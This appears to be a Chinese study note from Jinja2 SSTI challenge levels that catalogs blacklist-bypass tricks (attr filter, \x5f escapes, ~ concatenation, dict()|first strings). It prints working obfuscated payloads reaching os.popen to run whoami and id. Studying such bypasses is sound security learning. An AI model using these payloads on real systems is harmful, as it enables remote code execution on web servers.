## 二、知识点（今天搞懂的「绕过怎么换零件」）

- **三个抽屉**：字符串从哪来（6 种）/ 属性怎么取（5 种）/ 结果怎么写（3 种）。被禁哪个零件，就去对应抽屉换一个
- **按「禁什么」查表最省事**：
  - 禁 `.` → `|attr('名')`
  - 禁 `_` → `\x5f` 转义
  - 禁关键词（`os` / `popen` / `read`）→ `~` 拼接拆开
  - 禁 `{{ }}` → `{% print(...) %}`
  - 禁引号 → `dict(名=1)|first` 造字符串
- **`dict(名=1)|first` 的原理**：dict 迭代默认给的是**键**，所以 `dict(os=1)|first` 拿到的就是字符串 `"os"` —— 不写引号也能造出任意字符串
- **`dict` 有三条限制**：键必须可哈希、键名要能当关键字参数（不能带特殊符号）、不能数字开头（所以第 12 关用 `true` 顶替数字）
- **`|attr` 取到方法要给值**：链上取到的是方法本身，后面必须再调一次 `()` 才出结果
- **字符串四种载体**：字面量 → URL 参数 → `dict` 键名 → 从对象 repr 里抠字符；被禁一层换下一层，这是第 13 关「全禁」还能拼出 payload 的原因
- **黑名单 vs 沙箱**：黑名单只查原文，换写法能绕；沙箱拦的是能力，换写法照样拦

## 三、案例 / payload

同一件事的两种写法（语义完全相同，只是每个语法节点换了形式）：

```jinja
原版：
{{ lipsum.__globals__['os'].popen('whoami').read() }}

禁点号 + 禁引号：
{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)('whoami')|attr(dict(read=1)|first)() }}

禁点号 + 禁下划线 + 禁关键词（三招合体）：
{{ lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('o'~'s')|attr('po'~'pen')('id')|attr('re'~'ad')() }}
```

**逐段对照**：

| 段 | 原写法 | 绕过写法 | 为什么检查不到 |
|---|---|---|---|
| 取属性 | `.__globals__` | `\|attr(dict(__globals__=1)\|first)` | 属性名变成运行期算出来的字符串 |
| 取键 | `['os']` | `\|attr('__getitem__')(dict(os=1)\|first)` | 原文里没有 `'os'` |
| 调方法 | `.popen('whoami')` | `\|attr(dict(popen=1)\|first)('whoami')` | 方法名同样运行期才拼出来 |
| 读结果 | `.read()` | `\|attr(dict(read=1)\|first)()` | 同上 |
